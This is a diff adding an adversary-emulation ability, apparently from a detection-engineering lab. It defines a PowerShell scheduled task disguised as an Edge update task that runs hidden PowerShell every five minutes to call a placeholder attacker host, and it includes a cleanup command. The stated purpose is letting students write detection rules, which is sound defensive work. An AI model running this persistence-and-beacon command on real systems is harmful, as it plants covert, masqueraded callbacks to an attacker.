@@ -1,0 +1,20 @@
+---
+
+- id: 4a100010-cafe-4001-8001-c0ffee000010
+  name: Scheduled task persistence for detection rule authoring (L7 anomaly 3)
+  description: Create a scheduled task that runs on a short recurring trigger so students can write a detection rule that fires on Windows 4698 and correlates with prior beaconing
+  tactic: persistence
+  technique:
+    attack_id: T1053.005
+    name: "Scheduled Task/Job: Scheduled Task"
+  platforms:
+    windows:
+      psh:
+        command: |
+          $taskName = "MicrosoftEdgeUpdateL7_" + (Get-Random);
+          $action   = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -c Invoke-WebRequest http://#{attacker.host.ip}:8080 -ErrorAction SilentlyContinue | Out-Null";
+          $trigger  = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 1);
+          Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force | Out-Null;
+          Write-Host "[L7-3] Scheduled task persistence created: $taskName"
+        cleanup: |
+          Get-ScheduledTask | Where-Object { $_.TaskName -like "MicrosoftEdgeUpdateL7_*" } | Unregister-ScheduledTask -Confirm:$false
